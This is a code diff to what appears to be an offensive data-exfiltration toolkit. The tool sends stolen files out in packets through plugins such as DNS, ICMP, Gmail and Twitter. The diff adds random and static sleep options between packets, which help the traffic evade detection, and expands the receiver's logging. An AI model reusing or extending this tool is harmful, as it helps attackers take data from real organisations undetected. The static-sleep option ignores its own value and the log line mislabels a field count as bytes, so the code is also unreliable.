@@ -237,9 +237,10 @@ class Exfiltration(object):
         try:
             message = data
             if (message.count("|!|") >= 2):
-                info("Received {0} bytes".format(len(message)))
                 message = message.split("|!|")
                 jobid = message[0]
+                packet_index = message[1]
+                info("Received {0} bytes of job {1}, with packet_index {2}".format(len(message), jobid, packet_index))
 
                 # register packet
                 if (message[2] == "REGISTER"):
@@ -326,9 +327,12 @@ class ExfiltrateFile(threading.Thread):
             plugin_send_function(data)
             packet_index = packet_index + 1
 
-            time_to_sleep = randint(1, MAX_TIME_SLEEP)
-            display_message("Sleeping for %s seconds" % time_to_sleep)
-            time.sleep(time_to_sleep)
+            if self.exfiltrate.results.shall_sleep:
+                time_to_sleep = randint(1, MAX_TIME_SLEEP)
+                display_message("Sleeping for %s seconds" % time_to_sleep)
+                time.sleep(time_to_sleep)
+            elif self.exfiltrate.results.shall_static_sleep:
+                time.sleep(1/1000.)
 
         # last packet
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
@@ -362,11 +366,19 @@ def main():
                         default=None, help="Plugins to use (eg. '-p dns,twitter')")
     parser.add_argument('-e', action="store", dest="exclude",
                         default=None, help="Plugins to exclude (eg. '-e gmail,icmp')")
+
+    sleepMode = parser.add_mutually_exclusive_group()
+    sleepMode.add_argument('-s', action="store_true", dest="shall_sleep",
+                        default=False, help="Activate Sleep between packets")
+    sleepMode.add_argument('-S', action="store", dest="shall_static_sleep",
+                        default=0, help="Activate Static Sleep in Miliseconds (e.g. '-S 10')")
+
     listenMode = parser.add_mutually_exclusive_group()
     listenMode.add_argument('-L', action="store_true",
                         dest="listen", default=False, help="Server mode")
     listenMode.add_argument('-Z', action="store_true",
                         dest="proxy", default=False, help="Proxy mode")
+
     results = parser.parse_args()
 
     if (results.config is None):
